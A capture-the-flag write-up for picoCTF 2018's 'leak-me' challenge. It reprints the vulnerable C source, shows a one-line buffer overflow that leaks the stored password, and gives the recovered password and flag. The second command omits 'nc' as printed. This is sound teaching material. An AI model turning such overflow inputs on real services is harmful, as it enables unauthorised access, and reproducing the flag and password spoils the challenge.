---
layout: writeup
title: 'Binary Exploitation 200: leak-me'
level: 
difficulty: 
points: 
categories: []
tags: []
flag: picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}
---
## Challenge

Can you authenticate to [this service](writeupfiles/auth) and get the
flag? Connect with nc 2018shell1.picoctf.com 31045.

[Source](writeupfiles)

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>
    #include <sys/types.h>
    
    int flag() {
      char flag[48];
      FILE *file;
      file = fopen("flag.txt", "r");
      if (file == NULL) {
        printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
        exit(0);
      }
    
      fgets(flag, sizeof(flag), file);
      printf("%s", flag);
      return 0;
    }
    
    
    int main(int argc, char **argv){
    
      setvbuf(stdout, NULL, _IONBF, 0);
    
      // Set the gid to the effective gid
      gid_t gid = getegid();
      setresgid(gid, gid, gid);
    
      // real pw:
      FILE *file;
      char password[64];
      char name[256];
      char password_input[64];
    
      memset(password, 0, sizeof(password));
      memset(name, 0, sizeof(name));
      memset(password_input, 0, sizeof(password_input));
    
      printf("What is your name?\n");
    
      fgets(name, sizeof(name), stdin);
      char *end = strchr(name, '\n');
      if (end != NULL) {
        *end = '\x00';
      }
    
      strcat(name, ",\nPlease Enter the Password.");
    
      file = fopen("password.txt", "r");
      if (file == NULL) {
        printf("Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
        exit(0);
      }
    
      fgets(password, sizeof(password), file);
    
      printf("Hello ");
      puts(name);
    
      fgets(password_input, sizeof(password_input), stdin);
      password_input[sizeof(password_input)] = '\x00';
    
      if (!strcmp(password_input, password)) {
        flag();
      }
      else {
        printf("Incorrect Password!\n");
      }
      return 0;
    }
{: .language-c}

If we overflow the buffer for the `name` variable, we can get the flag

    $ python -c 'print("a" * 300)' | nc 2018shell1.picoctf.com 31045
    Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s$word_d98e8d
    
    Incorrect Password!

so it output the password for this, we connect again and use the
password to get our flag:

    $ echo -e 'bla\na_reAllY_s3cuRe_p4s$word_d98e8d' | 2018shell1.picoctf.com 31045
    What is your name?
    bla
    Hello bla,
    Please Enter the Password.
    picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}

## Solution

